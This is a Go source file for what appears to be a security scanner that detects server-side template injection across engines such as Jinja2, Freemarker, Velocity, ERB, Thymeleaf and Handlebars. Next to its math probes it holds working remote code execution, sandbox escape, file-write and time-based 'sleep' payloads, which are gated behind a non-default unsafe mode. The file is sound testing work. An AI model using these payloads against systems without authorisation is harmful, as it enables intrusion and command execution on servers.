// Package ssti provides Server-Side Template Injection (SSTI) detection and testing capabilities.
// It supports detection of template injection vulnerabilities across multiple template engines
// including Jinja2, Twig, Freemarker, Velocity, Smarty, Mako, ERB, Pebble, and more.
package ssti

import (
	"context"
	"crypto/rand"
	"fmt"
	"io"
	"math/big"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"time"

	"github.com/waftester/waftester/pkg/attackconfig"
	"github.com/waftester/waftester/pkg/defaults"
	"github.com/waftester/waftester/pkg/duration"
	"github.com/waftester/waftester/pkg/finding"
	"github.com/waftester/waftester/pkg/httpclient"
	"github.com/waftester/waftester/pkg/iohelper"
)

// TemplateEngine represents a server-side template engine
type TemplateEngine string

const (
	EngineJinja2     TemplateEngine = "jinja2"
	EngineTwig       TemplateEngine = "twig"
	EngineFreemarker TemplateEngine = "freemarker"
	EngineVelocity   TemplateEngine = "velocity"
	EngineSmarty     TemplateEngine = "smarty"
	EngineMako       TemplateEngine = "mako"
	EngineERB        TemplateEngine = "erb"
	EnginePebble     TemplateEngine = "pebble"
	EngineThymeleaf  TemplateEngine = "thymeleaf"
	EngineNunjucks   TemplateEngine = "nunjucks"
	EngineHandlebars TemplateEngine = "handlebars"
	EngineMustache   TemplateEngine = "mustache"
	EngineTornado    TemplateEngine = "tornado"
	EngineDjango     TemplateEngine = "django"
	EngineRazor      TemplateEngine = "razor"
	EngineUnknown    TemplateEngine = "unknown"
)

// PayloadType represents the type of SSTI payload
type PayloadType string

const (
	PayloadProbe          PayloadType = "probe"          // Detection probes
	PayloadMath           PayloadType = "math"           // Mathematical expressions
	PayloadBlind          PayloadType = "blind"          // Blind SSTI (time-based)
	PayloadRCE            PayloadType = "rce"            // Remote code execution
	PayloadFileRead       PayloadType = "file_read"      // File reading
	PayloadSandboxEscape  PayloadType = "sandbox_escape" // Sandbox escape
	PayloadInfoDisclosure PayloadType = "info_disclosure"
)

// Payload represents an SSTI payload
type Payload struct {
	Template       string         // The template injection payload
	Engine         TemplateEngine // Target template engine
	Type           PayloadType    // Payload type
	ExpectedOutput string         // Expected output if vulnerable
	Regex          *regexp.Regexp // Regex pattern to match in response
	Description    string         // Description of what this payload does
	Severity       finding.Severity // Severity if successful
	MathA          int            // First number for math probes
	MathB          int            // Second number for math probes
	MathResult     int            // Expected result for math probes
}

// Vulnerability represents a detected SSTI vulnerability
type Vulnerability struct {
	finding.Vulnerability
	Engine         TemplateEngine `json:"engine"`          // Detected template engine
	Payload        *Payload       `json:"payload,omitempty"` // Payload that triggered the vuln
	Confidence     string         `json:"confidence"`      // high, medium, low
	CanExecuteCode bool           `json:"can_execute_code"` // Whether RCE is possible
	RCEPayload     string         `json:"rce_payload,omitempty"` // Example RCE payload
}

// DetectorConfig configures the SSTI detector
type DetectorConfig struct {
	attackconfig.Base
	FollowRedirect bool             // Follow HTTP redirects
	Headers        http.Header      // Additional headers
	Cookies        []*http.Cookie   // Cookies to include
	Proxy          string           // HTTP proxy URL
	SafeMode       bool             // Only use safe detection payloads
	BlindDelay     time.Duration    // Delay for blind SSTI
	Engines        []TemplateEngine // Only test these engines (empty = all)
	PayloadTypes   []PayloadType    // Only use these payload types
	Verbose        bool             // Verbose output
}

// DefaultConfig returns a default detector configuration
func DefaultConfig() *DetectorConfig {
	return &DetectorConfig{
		Base: attackconfig.Base{
			Timeout:     duration.DialTimeout,
			UserAgent:   defaults.UAChrome,
			MaxPayloads: 50,
		},
		FollowRedirect: false,
		SafeMode:       true,
		BlindDelay:     duration.HTTPProbing,
	}
}

// Detector performs SSTI vulnerability detection
type Detector struct {
	config   *DetectorConfig
	client   *http.Client
	payloads []*Payload
}

// NewDetector creates a new SSTI detector
func NewDetector(config *DetectorConfig) *Detector {
	if config == nil {
		config = DefaultConfig()
	}

	d := &Detector{
		config: config,
		client: httpclient.Default(),
	}

	d.payloads = d.generatePayloads()

	return d
}

// generatePayloads creates all SSTI payloads
func (d *Detector) generatePayloads() []*Payload {
	payloads := make([]*Payload, 0, 64)

	// Generate random numbers for math probes (harder to false positive)
	a, b := randomMathValues()
	result := a * b

	// Jinja2/Twig payloads
	payloads = append(payloads, d.jinja2Payloads(a, b, result)...)

	// Freemarker payloads
	payloads = append(payloads, d.freemarkerPayloads(a, b, result)...)

	// Velocity payloads
	payloads = append(payloads, d.velocityPayloads(a, b, result)...)

	// Smarty payloads
	payloads = append(payloads, d.smartyPayloads(a, b, result)...)

	// Mako payloads
	payloads = append(payloads, d.makoPayloads(a, b, result)...)

	// ERB payloads
	payloads = append(payloads, d.erbPayloads(a, b, result)...)

	// Pebble payloads
	payloads = append(payloads, d.pebblePayloads(a, b, result)...)

	// Thymeleaf payloads
	payloads = append(payloads, d.thymeleafPayloads(a, b, result)...)

	// Nunjucks payloads
	payloads = append(payloads, d.nunjucksPayloads(a, b, result)...)

	// Handlebars payloads
	payloads = append(payloads, d.handlebarsPayloads(a, b, result)...)

	// Tornado payloads
	payloads = append(payloads, d.tornadoPayloads(a, b, result)...)

	// Django payloads
	payloads = append(payloads, d.djangoPayloads(a, b, result)...)

	// Razor payloads
	payloads = append(payloads, d.razorPayloads(a, b, result)...)

	// Universal/polyglot payloads
	payloads = append(payloads, d.universalPayloads(a, b, result)...)

	return payloads
}

func randomMathValues() (int, int) {
	// Generate random values between 1000-9999 to avoid false positives
	aVal, err := rand.Int(rand.Reader, big.NewInt(9000))
	if err != nil {
		// Fallback to deterministic but varied values on rand failure
		return 7919, 8731
	}
	bVal, err := rand.Int(rand.Reader, big.NewInt(9000))
	if err != nil {
		return int(aVal.Int64()) + 1000, 8731
	}
	return int(aVal.Int64()) + 1000, int(bVal.Int64()) + 1000
}

func (d *Detector) jinja2Payloads(a, b, result int) []*Payload {
	resultStr := fmt.Sprintf("%d", result)

	payloads := []*Payload{
		// Math probes
		{
			Template:       fmt.Sprintf("{{%d*%d}}", a, b),
			Engine:         EngineJinja2,
			Type:           PayloadMath,
			ExpectedOutput: resultStr,
			Description:    "Jinja2 basic math expression",
			Severity:       finding.High,
			MathA:          a,
			MathB:          b,
			MathResult:     result,
		},
		{
			Template:       fmt.Sprintf("{{ %d * %d }}", a, b),
			Engine:         EngineJinja2,
			Type:           PayloadMath,
			ExpectedOutput: resultStr,
			Description:    "Jinja2 spaced math expression",
			Severity:       finding.High,
			MathA:          a,
			MathB:          b,
			MathResult:     result,
		},
		{
			Template:       fmt.Sprintf("{%%print(%d*%d)%%}", a, b),
			Engine:         EngineJinja2,
			Type:           PayloadMath,
			ExpectedOutput: resultStr,
			Description:    "Jinja2 print statement",
			Severity:       finding.High,
			MathA:          a,
			MathB:          b,
			MathResult:     result,
		},
		// Detection probes
		{
			Template:       "{{7*'7'}}",
			Engine:         EngineJinja2,
			Type:           PayloadProbe,
			ExpectedOutput: "7777777",
			Description:    "Jinja2 string multiplication",
			Severity:       finding.High,
		},
		{
			Template:    "{{config}}",
			Engine:      EngineJinja2,
			Type:        PayloadInfoDisclosure,
			Regex:       regexp.MustCompile(`(?i)config|secret|debug`),
			Description: "Jinja2 config object access",
			Severity:    finding.Medium,
		},
		{
			Template:    "{{self}}",
			Engine:      EngineJinja2,
			Type:        PayloadInfoDisclosure,
			Regex:       regexp.MustCompile(`(?i)template|object|context`),
			Description: "Jinja2 self object access",
			Severity:    finding.Medium,
		},
		{
			Template:    "{{request.environ}}",
			Engine:      EngineJinja2,
			Type:        PayloadInfoDisclosure,
			Regex:       regexp.MustCompile(`(?i)environ|wsgi|server`),
			Description: "Jinja2 request environ access",
			Severity:    finding.Medium,
		},
	}

	// RCE payloads (not in safe mode)
	if !d.config.SafeMode {
		payloads = append(payloads, []*Payload{
			{
				Template:    "{{''.__class__.__mro__[2].__subclasses__()}}",
				Engine:      EngineJinja2,
				Type:        PayloadSandboxEscape,
				Regex:       regexp.MustCompile(`(?i)subprocess|popen|os`),
				Description: "Jinja2 sandbox escape - class enumeration",
				Severity:    finding.Critical,
			},
			{
				Template:    "{{lipsum.__globals__['os'].popen('id').read()}}",
				Engine:      EngineJinja2,
				Type:        PayloadRCE,
				Regex:       regexp.MustCompile(`uid=|gid=`),
				Description: "Jinja2 RCE via lipsum globals",
				Severity:    finding.Critical,
			},
			{
				Template:    "{{cycler.__init__.__globals__.os.popen('id').read()}}",
				Engine:      EngineJinja2,
				Type:        PayloadRCE,
				Regex:       regexp.MustCompile(`uid=|gid=`),
				Description: "Jinja2 RCE via cycler globals",
				Severity:    finding.Critical,
			},
		}...)
	}

	return payloads
}

func (d *Detector) freemarkerPayloads(a, b, result int) []*Payload {
	resultStr := fmt.Sprintf("%d", result)

	payloads := []*Payload{
		{
			Template:       fmt.Sprintf("${%d*%d}", a, b),
			Engine:         EngineFreemarker,
			Type:           PayloadMath,
			ExpectedOutput: resultStr,
			Description:    "Freemarker math expression",
			Severity:       finding.High,
			MathA:          a,
			MathB:          b,
			MathResult:     result,
		},
		{
			Template:       fmt.Sprintf("#{%d*%d}", a, b),
			Engine:         EngineFreemarker,
			Type:           PayloadMath,
			ExpectedOutput: resultStr,
			Description:    "Freemarker hash math expression",
			Severity:       finding.High,
			MathA:          a,
			MathB:          b,
			MathResult:     result,
		},
		{
			Template:       fmt.Sprintf("[=%d*%d]", a, b),
			Engine:         EngineFreemarker,
			Type:           PayloadMath,
			ExpectedOutput: resultStr,
			Description:    "Freemarker square bracket expression",
			Severity:       finding.High,
			MathA:          a,
			MathB:          b,
			MathResult:     result,
		},
		{
			Template:    "${.data_model}",
			Engine:      EngineFreemarker,
			Type:        PayloadInfoDisclosure,
			Regex:       regexp.MustCompile(`(?i)model|data|hash`),
			Description: "Freemarker data model access",
			Severity:    finding.Medium,
		},
	}

	if !d.config.SafeMode {
		payloads = append(payloads, []*Payload{
			{
				Template:    `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`,
				Engine:      EngineFreemarker,
				Type:        PayloadRCE,
				Regex:       regexp.MustCompile(`uid=|gid=`),
				Description: "Freemarker RCE via Execute",
				Severity:    finding.Critical,
			},
			{
				Template:    `${"freemarker.template.utility.Execute"?new()("id")}`,
				Engine:      EngineFreemarker,
				Type:        PayloadRCE,
				Regex:       regexp.MustCompile(`uid=|gid=`),
				Description: "Freemarker RCE inline Execute",
				Severity:    finding.Critical,
			},
		}...)
	}

	return payloads
}

func (d *Detector) velocityPayloads(a, b, result int) []*Payload {
	resultStr := fmt.Sprintf("%d", result)

	payloads := []*Payload{
		{
			Template:       fmt.Sprintf("#set($x=%d*%d)${x}", a, b),
			Engine:         EngineVelocity,
			Type:           PayloadMath,
			ExpectedOutput: resultStr,
			Description:    "Velocity set and output",
			Severity:       finding.High,
			MathA:          a,
			MathB:          b,
			MathResult:     result,
		},
		{
			Template:       fmt.Sprintf("$class.inspect('java.lang.Math').type.forName('java.lang.Math').getDeclaredMethod('addExact', $class.inspect('java.lang.Integer').type, $class.inspect('java.lang.Integer').type).invoke(null, %d, %d)", a, b),
			Engine:         EngineVelocity,
			Type:           PayloadMath,
			ExpectedOutput: fmt.Sprintf("%d", a+b),
			Description:    "Velocity Math reflection",
			Severity:       finding.High,
		},
	}

	if !d.config.SafeMode {
		payloads = append(payloads, []*Payload{
			{
				Template:    `#set($rt=$class.inspect('java.lang.Runtime').type.getRuntime())$rt.exec('id')`,
				Engine:      EngineVelocity,
				Type:        PayloadRCE,
				Description: "Velocity RCE via Runtime",
				Severity:    finding.Critical,
			},
			{
				Template:    `$class.inspect('java.lang.Runtime').type.getRuntime().exec('id').waitFor()`,
				Engine:      EngineVelocity,
				Type:        PayloadRCE,
				Description: "Velocity RCE inline Runtime",
				Severity:    finding.Critical,
			},
		}...)
	}

	return payloads
}

func (d *Detector) smartyPayloads(a, b, result int) []*Payload {
	resultStr := fmt.Sprintf("%d", result)

	payloads := []*Payload{
		{
			Template:       fmt.Sprintf("{%d*%d}", a, b),
			Engine:         EngineSmarty,
			Type:           PayloadMath,
			ExpectedOutput: resultStr,
			Description:    "Smarty math expression",
			Severity:       finding.High,
			MathA:          a,
			MathB:          b,
			MathResult:     result,
		},
		{
			Template:       fmt.Sprintf("{math equation=\"%d*%d\"}", a, b),
			Engine:         EngineSmarty,
			Type:           PayloadMath,
			ExpectedOutput: resultStr,
			Description:    "Smarty math tag",
			Severity:       finding.High,
			MathA:          a,
			MathB:          b,
			MathResult:     result,
		},
		{
			Template:    "{$smarty.version}",
			Engine:      EngineSmarty,
			Type:        PayloadInfoDisclosure,
			Regex:       regexp.MustCompile(`[0-9]+\.[0-9]+`),
			Description: "Smarty version disclosure",
			Severity:    finding.Low,
		},
	}

	if !d.config.SafeMode {
		payloads = append(payloads, []*Payload{
			{
				Template:    `{php}system('id');{/php}`,
				Engine:      EngineSmarty,
				Type:        PayloadRCE,
				Regex:       regexp.MustCompile(`uid=|gid=`),
				Description: "Smarty RCE via php tag (Smarty < 3)",
				Severity:    finding.Critical,
			},
			{
				Template:    `{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system('id'); ?>",self::clearConfig())}`,
				Engine:      EngineSmarty,
				Type:        PayloadRCE,
				Description: "Smarty RCE via file write",
				Severity:    finding.Critical,
			},
		}...)
	}

	return payloads
}

func (d *Detector) makoPayloads(a, b, result int) []*Payload {
	resultStr := fmt.Sprintf("%d", result)

	payloads := []*Payload{
		{
			Template:       fmt.Sprintf("${%d*%d}", a, b),
			Engine:         EngineMako,
			Type:           PayloadMath,
			ExpectedOutput: resultStr,
			Description:    "Mako math expression",
			Severity:       finding.High,
			MathA:          a,
			MathB:          b,
			MathResult:     result,
		},
		{
			Template:       fmt.Sprintf("<%%\nx=%d*%d\n%%>${x}", a, b),
			Engine:         EngineMako,
			Type:           PayloadMath,
			ExpectedOutput: resultStr,
			Description:    "Mako Python block",
			Severity:       finding.High,
			MathA:          a,
			MathB:          b,
			MathResult:     result,
		},
	}

	if !d.config.SafeMode {
		payloads = append(payloads, []*Payload{
			{
				Template:    `<%import os%>${os.popen('id').read()}`,
				Engine:      EngineMako,
				Type:        PayloadRCE,
				Regex:       regexp.MustCompile(`uid=|gid=`),
				Description: "Mako RCE via os import",
				Severity:    finding.Critical,
			},
			{
				Template:    `${self.module.cache.util.os.popen('id').read()}`,
				Engine:      EngineMako,
				Type:        PayloadRCE,
				Regex:       regexp.MustCompile(`uid=|gid=`),
				Description: "Mako RCE via module cache",
				Severity:    finding.Critical,
			},
		}...)
	}

	return payloads
}

func (d *Detector) erbPayloads(a, b, result int) []*Payload {
	resultStr := fmt.Sprintf("%d", result)

	payloads := []*Payload{
		{
			Template:       fmt.Sprintf("<%%= %d*%d %%>", a, b),
			Engine:         EngineERB,
			Type:           PayloadMath,
			ExpectedOutput: resultStr,
			Description:    "ERB math expression",
			Severity:       finding.High,
			MathA:          a,
			MathB:          b,
			MathResult:     result,
		},
		{
			Template:       fmt.Sprintf("#{%d*%d}", a, b),
			Engine:         EngineERB,
			Type:           PayloadMath,
			ExpectedOutput: resultStr,
			Description:    "ERB string interpolation",
			Severity:       finding.High,
			MathA:          a,
			MathB:          b,
			MathResult:     result,
		},
	}

	if !d.config.SafeMode {
		payloads = append(payloads, []*Payload{
			{
				Template:    `<%= system('id') %>`,
				Engine:      EngineERB,
				Type:        PayloadRCE,
				Regex:       regexp.MustCompile(`uid=|gid=`),
				Description: "ERB RCE via system",
				Severity:    finding.Critical,
			},
			{
				Template:    "<%= `id` %>",
				Engine:      EngineERB,
				Type:        PayloadRCE,
				Regex:       regexp.MustCompile(`uid=|gid=`),
				Description: "ERB RCE via backticks",
				Severity:    finding.Critical,
			},
			{
				Template:    `<%= IO.popen('id').read() %>`,
				Engine:      EngineERB,
				Type:        PayloadRCE,
				Regex:       regexp.MustCompile(`uid=|gid=`),
				Description: "ERB RCE via IO.popen",
				Severity:    finding.Critical,
			},
		}...)
	}

	return payloads
}

func (d *Detector) pebblePayloads(a, b, result int) []*Payload {
	resultStr := fmt.Sprintf("%d", result)

	payloads := []*Payload{
		{
			Template:       fmt.Sprintf("{{ %d * %d }}", a, b),
			Engine:         EnginePebble,
			Type:           PayloadMath,
			ExpectedOutput: resultStr,
			Description:    "Pebble math expression",
			Severity:       finding.High,
			MathA:          a,
			MathB:          b,
			MathResult:     result,
		},
	}

	if !d.config.SafeMode {
		payloads = append(payloads, []*Payload{
			{
				Template:    `{% set cmd = 'id' %}{{ [cmd]|filter('system')|join }}`,
				Engine:      EnginePebble,
				Type:        PayloadRCE,
				Regex:       regexp.MustCompile(`uid=|gid=`),
				Description: "Pebble RCE via filter",
				Severity:    finding.Critical,
			},
		}...)
	}

	return payloads
}

func (d *Detector) thymeleafPayloads(a, b, result int) []*Payload {
	resultStr := fmt.Sprintf("%d", result)

	payloads := []*Payload{
		{
			Template:       fmt.Sprintf("[[${%d*%d}]]", a, b),
			Engine:         EngineThymeleaf,
			Type:           PayloadMath,
			ExpectedOutput: resultStr,
			Description:    "Thymeleaf inline expression",
			Severity:       finding.High,
			MathA:          a,
			MathB:          b,
			MathResult:     result,
		},
		{
			Template:       fmt.Sprintf("__${%d*%d}__", a, b),
			Engine:         EngineThymeleaf,
			Type:           PayloadMath,
			ExpectedOutput: resultStr,
			Description:    "Thymeleaf preprocessing",
			Severity:       finding.High,
			MathA:          a,
			MathB:          b,
			MathResult:     result,
		},
	}

	if !d.config.SafeMode {
		payloads = append(payloads, []*Payload{
			{
				Template:    `${T(java.lang.Runtime).getRuntime().exec('id')}`,
				Engine:      EngineThymeleaf,
				Type:        PayloadRCE,
				Description: "Thymeleaf RCE via Runtime",
				Severity:    finding.Critical,
			},
			{
				Template:    `__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()%7d__`,
				Engine:      EngineThymeleaf,
				Type:        PayloadRCE,
				Description: "Thymeleaf RCE URL encoded",
				Severity:    finding.Critical,
			},
		}...)
	}

	return payloads
}

func (d *Detector) nunjucksPayloads(a, b, result int) []*Payload {
	resultStr := fmt.Sprintf("%d", result)

	return []*Payload{
		{
			Template:       fmt.Sprintf("{{%d*%d}}", a, b),
			Engine:         EngineNunjucks,
			Type:           PayloadMath,
			ExpectedOutput: resultStr,
			Description:    "Nunjucks math expression",
			Severity:       finding.High,
			MathA:          a,
			MathB:          b,
			MathResult:     result,
		},
		{
			Template:       fmt.Sprintf("{{ %d * %d }}", a, b),
			Engine:         EngineNunjucks,
			Type:           PayloadMath,
			ExpectedOutput: resultStr,
			Description:    "Nunjucks spaced math",
			Severity:       finding.High,
			MathA:          a,
			MathB:          b,
			MathResult:     result,
		},
		{
			Template:    "{{range.constructor('return global.process.mainModule.require(\"child_process\").execSync(\"id\")')()}}",
			Engine:      EngineNunjucks,
			Type:        PayloadRCE,
			Regex:       regexp.MustCompile(`uid=|gid=`),
			Description: "Nunjucks RCE via constructor",
			Severity:    finding.Critical,
		},
	}
}

func (d *Detector) handlebarsPayloads(a, b, result int) []*Payload {
	return []*Payload{
		{
			Template:    "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').execSync('id');\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}",
			Engine:      EngineHandlebars,
			Type:        PayloadRCE,
			Regex:       regexp.MustCompile(`uid=|gid=`),
			Description: "Handlebars RCE via prototype pollution",
			Severity:    finding.Critical,
		},
	}
}

func (d *Detector) tornadoPayloads(a, b, result int) []*Payload {
	resultStr := fmt.Sprintf("%d", result)

	payloads := []*Payload{
		{
			Template:       fmt.Sprintf("{{%d*%d}}", a, b),
			Engine:         EngineTornado,
			Type:           PayloadMath,
			ExpectedOutput: resultStr,
			Description:    "Tornado math expression",
			Severity:       finding.High,
			MathA:          a,
			MathB:          b,
			MathResult:     result,
		},
	}

	if !d.config.SafeMode {
		payloads = append(payloads, []*Payload{
			{
				Template:    `{%import os%}{{os.popen('id').read()}}`,
				Engine:      EngineTornado,
				Type:        PayloadRCE,
				Regex:       regexp.MustCompile(`uid=|gid=`),
				Description: "Tornado RCE via import",
				Severity:    finding.Critical,
			},
		}...)
	}

	return payloads
}

func (d *Detector) djangoPayloads(a, b, result int) []*Payload {
	return []*Payload{
		{
			Template:    "{{settings}}",
			Engine:      EngineDjango,
			Type:        PayloadInfoDisclosure,
			Regex:       regexp.MustCompile(`(?i)secret|debug|database`),
			Description: "Django settings disclosure",
			Severity:    finding.Medium,
		},
		{
			Template:    "{{debug}}",
			Engine:      EngineDjango,
			Type:        PayloadInfoDisclosure,
			Description: "Django debug mode check",
			Severity:    finding.Low,
		},
	}
}

func (d *Detector) razorPayloads(a, b, result int) []*Payload {
	resultStr := fmt.Sprintf("%d", result)

	payloads := []*Payload{
		{
			Template:       fmt.Sprintf("@(%d*%d)", a, b),
			Engine:         EngineRazor,
			Type:           PayloadMath,
			ExpectedOutput: resultStr,
			Description:    "Razor math expression",
			Severity:       finding.High,
			MathA:          a,
			MathB:          b,
			MathResult:     result,
		},
	}

	if !d.config.SafeMode {
		payloads = append(payloads, []*Payload{
			{
				Template:    `@{var x = new System.Diagnostics.Process();x.StartInfo.FileName = "cmd";x.StartInfo.Arguments = "/c id";x.Start();}`,
				Engine:      EngineRazor,
				Type:        PayloadRCE,
				Description: "Razor RCE via Process",
				Severity:    finding.Critical,
			},
		}...)
	}

	return payloads
}

func (d *Detector) universalPayloads(a, b, result int) []*Payload {
	resultStr := fmt.Sprintf("%d", result)

	// Polyglot payloads that work across multiple engines
	return []*Payload{
		{
			Template:       fmt.Sprintf("{{%d*%d}}", a, b),
			Engine:         EngineUnknown,
			Type:           PayloadMath,
			ExpectedOutput: resultStr,
			Description:    "Universal curly brace math (Jinja2/Twig/Tornado)",
			Severity:       finding.High,
			MathA:          a,
			MathB:          b,
			MathResult:     result,
		},
		{
			Template:       fmt.Sprintf("${%d*%d}", a, b),
			Engine:         EngineUnknown,
			Type:           PayloadMath,
			ExpectedOutput: resultStr,
			Description:    "Universal dollar brace math (Freemarker/Mako)",
			Severity:       finding.High,
			MathA:          a,
			MathB:          b,
			MathResult:     result,
		},
		{
			Template:       fmt.Sprintf("<%%= %d*%d %%>", a, b),
			Engine:         EngineUnknown,
			Type:           PayloadMath,
			ExpectedOutput: resultStr,
			Description:    "Universal ERB-style math",
			Severity:       finding.High,
			MathA:          a,
			MathB:          b,
			MathResult:     result,
		},
		{
			Template:       fmt.Sprintf("{%d*%d}", a, b),
			Engine:         EngineUnknown,
			Type:           PayloadMath,
			ExpectedOutput: resultStr,
			Description:    "Universal single brace math (Smarty)",
			Severity:       finding.High,
			MathA:          a,
			MathB:          b,
			MathResult:     result,
		},
		{
			Template:       fmt.Sprintf("${{%d*%d}}", a, b),
			Engine:         EngineUnknown,
			Type:           PayloadMath,
			ExpectedOutput: resultStr,
			Description:    "Universal dollar double brace (Thymeleaf)",
			Severity:       finding.High,
			MathA:          a,
			MathB:          b,
			MathResult:     result,
		},
	}
}

// GetPayloads returns all payloads, optionally filtered
func (d *Detector) GetPayloads(engine TemplateEngine, payloadType PayloadType) []*Payload {
	filtered := make([]*Payload, 0, len(d.payloads))

	for _, p := range d.payloads {
		if engine != "" && engine != EngineUnknown && p.Engine != engine && p.Engine != EngineUnknown {
			continue
		}
		if payloadType != "" && p.Type != payloadType {
			continue
		}
		filtered = append(filtered, p)
	}

	return filtered
}

// Detect tests a URL for SSTI vulnerabilities
func (d *Detector) Detect(ctx context.Context, targetURL string, parameter string) ([]*Vulnerability, error) {
	var vulns []*Vulnerability

	// Parse the URL
	parsedURL, err := url.Parse(targetURL)
	if err != nil {
		return nil, fmt.Errorf("invalid URL: %w", err)
	}

	// Get payloads to test
	payloads := d.getFilteredPayloads()

	// Get baseline response for false positive comparison
	baselineBody := d.getBaselineBody(ctx, parsedURL, parameter)

	// Test each payload
	for i, payload := range payloads {
		if d.config.MaxPayloads > 0 && i >= d.config.MaxPayloads {
			break
		}

		select {
		case <-ctx.Done():
			return vulns, ctx.Err()
		default:
		}

		vuln, err := d.testPayload(ctx, parsedURL, parameter, payload, baselineBody)
		if err != nil {
			continue
		}

		if vuln != nil {
			vulns = append(vulns, vuln)
		}
	}

	return vulns, nil
}

func (d *Detector) getFilteredPayloads() []*Payload {
	filtered := make([]*Payload, 0, len(d.payloads))

	for _, p := range d.payloads {
		// Check engine filter
		if len(d.config.Engines) > 0 {
			found := false
			for _, e := range d.config.Engines {
				if p.Engine == e || p.Engine == EngineUnknown {
					found = true
					break
				}
			}
			if !found {
				continue
			}
		}

		// Check payload type filter
		if len(d.config.PayloadTypes) > 0 {
			found := false
			for _, t := range d.config.PayloadTypes {
				if p.Type == t {
					found = true
					break
				}
			}
			if !found {
				continue
			}
		}

		// Skip dangerous payloads in safe mode
		if d.config.SafeMode && (p.Type == PayloadRCE || p.Type == PayloadSandboxEscape) {
			continue
		}

		filtered = append(filtered, p)
	}

	return filtered
}

func (d *Detector) testPayload(ctx context.Context, targetURL *url.URL, parameter string, payload *Payload, baselineBody string) (*Vulnerability, error) {
	// Build the request URL
	testURL := *targetURL
	query := testURL.Query()
	query.Set(parameter, payload.Template)
	testURL.RawQuery = query.Encode()

	// Create request
	req, err := http.NewRequestWithContext(ctx, "GET", testURL.String(), nil)
	if err != nil {
		return nil, err
	}

	// Set headers
	req.Header.Set("User-Agent", d.config.UserAgent)
	for key, values := range d.config.Headers {
		for _, v := range values {
			req.Header.Add(key, v)
		}
	}

	// Add cookies
	for _, cookie := range d.config.Cookies {
		req.AddCookie(cookie)
	}

	// Send request
	start := time.Now()
	resp, err := d.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer iohelper.DrainAndClose(resp.Body)
	elapsed := time.Since(start)

	// Read response body (limit to 1MB for safety)
	body, err := iohelper.ReadBodyDefault(resp.Body)
	if err != nil && err != io.EOF {
		return nil, err
	}
	bodyStr := string(body)

	// Check for vulnerability
	vuln := d.analyzeResponse(targetURL.String(), parameter, payload, bodyStr, elapsed, baselineBody)

	return vuln, nil
}

func (d *Detector) analyzeResponse(targetURL, parameter string, payload *Payload, body string, elapsed time.Duration, baselineBody string) *Vulnerability {
	var matched bool
	var evidence string
	confidence := "low"

	// Check for expected output (math expression result)
	if payload.ExpectedOutput != "" {
		if strings.Contains(body, payload.ExpectedOutput) {
			// Skip if expected output was already in baseline (false positive)
			if baselineBody == "" || !strings.Contains(baselineBody, payload.ExpectedOutput) {
				matched = true
				evidence = payload.ExpectedOutput
				confidence = "high"
			}
		}
	}

	// Check for regex match
	if payload.Regex != nil {
		matches := payload.Regex.FindStringSubmatch(body)
		if len(matches) > 0 {
			matched = true
			evidence = matches[0]
			if confidence == "low" {
				confidence = "medium"
			}
		}
	}

	// Math expression verification (strongest indicator)
	if payload.Type == PayloadMath && payload.MathResult != 0 {
		resultStr := fmt.Sprintf("%d", payload.MathResult)
		if strings.Contains(body, resultStr) {
			// Skip if math result was already in baseline (false positive)
			if baselineBody != "" && strings.Contains(baselineBody, resultStr) {
				// Math result naturally appears in page content — likely false positive
			} else {
				matched = true
				evidence = fmt.Sprintf("Math result %d found (from %d*%d)", payload.MathResult, payload.MathA, payload.MathB)
				confidence = "high"
			}
		}
	}

	if !matched {
		return nil
	}

	return &Vulnerability{
		Vulnerability: finding.Vulnerability{
			URL:          targetURL,
			Parameter:    parameter,
			Severity:     payload.Severity,
			Evidence:     evidence,
			ResponseTime: elapsed,
		},
		Engine:         payload.Engine,
		Payload:        payload,
		Confidence:     confidence,
		CanExecuteCode: payload.Type == PayloadRCE,
	}
}

// DetectBlind performs blind SSTI detection using time-based techniques
func (d *Detector) DetectBlind(ctx context.Context, targetURL string, parameter string) ([]*Vulnerability, error) {
	var vulns []*Vulnerability

	// Parse the URL
	parsedURL, err := url.Parse(targetURL)
	if err != nil {
		return nil, fmt.Errorf("invalid URL: %w", err)
	}

	// Time-based detection payloads
	blindPayloads := d.getBlindPayloads()

	for _, payload := range blindPayloads {
		select {
		case <-ctx.Done():
			return vulns, ctx.Err()
		default:
		}

		// First, send baseline request
		baselineTime, err := d.measureResponseTime(ctx, parsedURL, parameter, "baseline")
		if err != nil {
			continue
		}

		// Send payload
		payloadTime, err := d.measureResponseTime(ctx, parsedURL, parameter, payload.Template)
		if err != nil {
			continue
		}

		// Check if payload caused a delay
		delay := payloadTime - baselineTime
		if delay >= d.config.BlindDelay-time.Second {
			vulns = append(vulns, &Vulnerability{
				Vulnerability: finding.Vulnerability{
					URL:          targetURL,
					Parameter:    parameter,
					Severity:     finding.High,
					Evidence:     fmt.Sprintf("Time-based delay detected: baseline=%v, payload=%v, delta=%v", baselineTime, payloadTime, delay),
					ResponseTime: payloadTime,
				},
				Engine:     payload.Engine,
				Payload:    payload,
				Confidence: "medium",
			})
		}
	}

	return vulns, nil
}

func (d *Detector) getBlindPayloads() []*Payload {
	sleepSeconds := int(d.config.BlindDelay.Seconds())

	return []*Payload{
		// Jinja2 blind
		{
			Template:    fmt.Sprintf("{{cycler.__init__.__globals__.os.popen('sleep %d').read()}}", sleepSeconds),
			Engine:      EngineJinja2,
			Type:        PayloadBlind,
			Description: "Jinja2 blind time-based",
			Severity:    finding.High,
		},
		// Freemarker blind
		{
			Template:    fmt.Sprintf(`${"freemarker.template.utility.Execute"?new()("sleep %d")}`, sleepSeconds),
			Engine:      EngineFreemarker,
			Type:        PayloadBlind,
			Description: "Freemarker blind time-based",
			Severity:    finding.High,
		},
		// ERB blind
		{
			Template:    fmt.Sprintf("<%%= `sleep %d` %%>", sleepSeconds),
			Engine:      EngineERB,
			Type:        PayloadBlind,
			Description: "ERB blind time-based",
			Severity:    finding.High,
		},
		// Mako blind
		{
